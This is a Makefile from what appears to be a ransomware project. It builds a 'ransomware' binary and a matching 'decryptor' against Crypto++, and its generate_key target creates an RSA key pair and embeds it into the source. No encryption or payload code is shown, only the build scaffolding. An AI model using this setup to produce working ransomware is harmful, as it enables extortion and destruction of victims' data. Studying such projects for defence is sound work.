CXX := g++
CXXFLAGS := -Wall -g -O3 -s -std=c++20 -ffunction-sections -fdata-sections
LDFLAGS := -L/usr/lib -Llib/cryptopp -lstdc++ -lm -lcryptopp -Wl,--gc-sections


SRC := $(wildcard src/*.cpp)

CRYPTO_LIB := lib/cryptopp/libcryptopp.a
INC_FOLDERS := '-Iinclude' '-Ilib' '-Ilib/crypto'

SRC_DIR := src
OUTPUT_ROOT := build
OUTPUT_OBJ_DIR := ${OUTPUT_ROOT}/obj
OUTPUT_OBJ_RANSOMWARE_DIR := ${OUTPUT_OBJ_DIR}/ransomware
OUTPUT_OBJ_DECRYPTOR_DIR := ${OUTPUT_OBJ_DIR}/decryptor

OUTPUT_RANSOMWARE := ${OUTPUT_ROOT}/ransomware
OUTPUT_DECRYPTOR := ${OUTPUT_ROOT}/decryptor
OBJ := $(addprefix $(OUTPUT_OBJ_DIR)/,$(notdir $(subst .cpp,.o,$(SRC))))
OBJ_RANSOMWARE := $(addprefix $(OUTPUT_OBJ_RANSOMWARE_DIR)/,$(notdir $(subst .cpp,.o,$(SRC))))
OBJ_DECRYPTOR := $(addprefix $(OUTPUT_OBJ_DECRYPTOR_DIR)/,$(notdir $(subst .cpp,.o,$(SRC))))

all: $(OUTPUT_RANSOMWARE) $(OUTPUT_DECRYPTOR)

$(OUTPUT_OBJ_RANSOMWARE_DIR)/%.o: $(SRC_DIR)/%.cpp
	@mkdir -p $(dir $@)
	@echo -e "\e[1;34mBuilding \e[0m$? \e[1;34mfor \e[1;36mransomware\e[0m"
	@$(CXX) -DBUILD_RANSOMWARE $(CXXFLAGS) $(INC_FOLDERS) -c $< -o $@

$(OUTPUT_OBJ_DECRYPTOR_DIR)/%.o: $(SRC_DIR)/%.cpp
	@mkdir -p $(dir $@)
	@echo -e "\e[1;34mBuilding \e[0m$? \e[1;34mfor \e[1;35mdecryptor\e[0m"
	@$(CXX) $(CXXFLAGS) $(INC_FOLDERS) -c $< -o $@


$(OUTPUT_RANSOMWARE): $(OBJ_RANSOMWARE) $(CRYPTO_LIB)
	@echo -e "\e[1;32mGenerating \e[1;36m$@\e[0m"
	@$(CXX) $(CXXFLAGS) $^ -o $@ $(LDFLAGS)

$(OUTPUT_DECRYPTOR): $(OBJ_DECRYPTOR) $(CRYPTO_LIB)
	@echo -e "\e[1;32mGenerating \e[1;35m$@\e[0m"
	@$(CXX) $(CXXFLAGS) $^ -o $@ $(LDFLAGS)

$(CRYPTO_LIB):
	@echo Building CryptoPP
	@git -C lib/cryptopp checkout CRYPTOPP_8_7_0
	@$(MAKE) static -C lib/cryptopp

ransomware: $(OUTPUT_RANSOMWARE)
decryptor: $(OUTPUT_DECRYPTOR)

.PHONY: clean generate_key

generate_key:
	openssl genrsa -out key.pem 2048
	openssl rsa -in key.pem -pubout > key.pub
	openssl pkcs8 -nocrypt -in key.pem -inform PEM -topk8 -outform DER -out key.der
	openssl rsa -in key.pem -pubout -outform DER -out key_pub.der
	xxd -i -name private_key key.der > src/keys.cpp
	xxd -i -name public_key key_pub.der >> src/keys.cpp

clean:
	@rm -rf ${OUTPUT_ROOT}
